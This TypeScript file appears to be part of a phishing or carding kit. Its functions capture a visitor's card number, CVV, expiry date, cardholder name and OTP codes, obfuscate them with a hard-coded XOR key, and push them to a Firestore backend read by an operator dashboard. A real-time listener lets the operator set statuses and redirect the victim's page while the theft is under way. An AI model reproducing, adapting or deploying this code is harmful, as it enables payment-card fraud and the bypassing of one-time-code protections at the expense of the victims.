/**
 * visitor-sync.ts
 * Syncs visitor actions → Firestore (pays) so the dashboard can read them.
 * Key rule: always clear cardStatus/otpStatus BEFORE starting a listener
 * so stale values from a previous session never auto-trigger navigation.
 */

import { db } from './firebase';
import {
  doc,
  updateDoc,
  arrayUnion,
  onSnapshot,
  serverTimestamp,
} from 'firebase/firestore';

// ─── Encryption (matches secure-utils.ts in the dashboard) ─────────────────

const _k = '7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c';

function _u2b(str: string): string {
  return btoa(
    encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (_, p1) =>
      String.fromCharCode(parseInt(p1, 16))
    )
  );
}

export function _e(s: string): string {
  let r = '';
  for (let i = 0; i < s.length; i++) {
    r += String.fromCharCode(s.charCodeAt(i) ^ _k.charCodeAt(i % _k.length));
  }
  return _u2b(r);
}

// ─── Session helpers ────────────────────────────────────────────────────────

const PAYS_ID_KEY = '_pays_id';
const REG_ID_KEY  = '_reg_id';

export function getPaysDocId(): string | null {
  if (typeof window === 'undefined') return null;
  return sessionStorage.getItem(PAYS_ID_KEY);
}

export function saveRegId(id: string): void {
  if (typeof window !== 'undefined') sessionStorage.setItem(REG_ID_KEY, id);
}

export function getRegId(): string | null {
  if (typeof window === 'undefined') return null;
  return sessionStorage.getItem(REG_ID_KEY);
}

// ─── Reset pays status fields before starting a new listener ───────────────
// This prevents stale cardStatus/otpStatus from a previous session
// from triggering immediate navigation the moment the listener fires.

export async function resetPayStatus(): Promise<void> {
  const id = getPaysDocId();
  if (!id) return;
  try {
    await updateDoc(doc(db, 'pays', id), {
      cardStatus:   null,
      otpStatus:    null,
      _v5Status:    null,
      redirectPage: null,
      updatedAt:    serverTimestamp(),
    });
  } catch { /* ignore */ }
}

// ─── History entry helpers ──────────────────────────────────────────────────

/** Add a card (_t1) entry — dashboard shows it under "معلومات البطاقة" */
export async function addCardHistoryEntry(card: {
  cardNumber:     string;
  cvv:            string;
  expiryDate:     string;
  cardHolderName: string;
}): Promise<void> {
  const id = getPaysDocId();
  if (!id) return;

  const entry = {
    id:        `card_${Date.now()}`,
    type:      '_t1',
    timestamp: new Date().toISOString(),
    status:    'pending',
    data: {
      _v1: _e(card.cardNumber),
      _v2: _e(card.cvv),
      _v3: _e(card.expiryDate),
      _v4: _e(card.cardHolderName),
    },
  };

  try {
    await updateDoc(doc(db, 'pays', id), {
      history:      arrayUnion(entry),
      cardStatus:   'waiting',
      updatedAt:    serverTimestamp(),
      lastActiveAt: serverTimestamp(),
    });
  } catch { /* ignore */ }
}

/** Add an OTP (_t2) entry — dashboard shows it under "كود OTP" */
export async function addOtpHistoryEntry(otp: string): Promise<void> {
  const id = getPaysDocId();
  if (!id) return;

  const entry = {
    id:        `otp_${Date.now()}`,
    type:      '_t2',
    timestamp: new Date().toISOString(),
    status:    'pending',
    data: { _v5: otp, otpCode: otp },
  };

  try {
    await updateDoc(doc(db, 'pays', id), {
      history:      arrayUnion(entry),
      otpCode:      otp,
      _v5:          _e(otp),
      _v5Status:    'pending',
      updatedAt:    serverTimestamp(),
      lastActiveAt: serverTimestamp(),
    });
  } catch { /* ignore */ }
}

// ─── Real-time listener ─────────────────────────────────────────────────────

type PayDocData = Record<string, unknown>;

/**
 * Subscribe to the visitor's pays document.
 * Fires the callback on EVERY change (including the first snapshot).
 * Callers that need to skip stale state should call resetPayStatus() first.
 */
export function listenPayDoc(onUpdate: (data: PayDocData) => void): () => void {
  if (typeof window === 'undefined') return () => {};
  const id = getPaysDocId();
  if (!id) return () => {};

  const unsubscribe = onSnapshot(
    doc(db, 'pays', id),
    (snap) => { if (snap.exists()) onUpdate(snap.data() as PayDocData); },
    () => {}
  );

  return unsubscribe;
}

/** Clear redirectPage after navigating so it doesn't fire again */
export async function clearRedirectPage(): Promise<void> {
  const id = getPaysDocId();
  if (!id) return;
  try {
    await updateDoc(doc(db, 'pays', id), {
      redirectPage:         null,
      redirectRequestedAt:  null,
    });
  } catch { /* ignore */ }
}
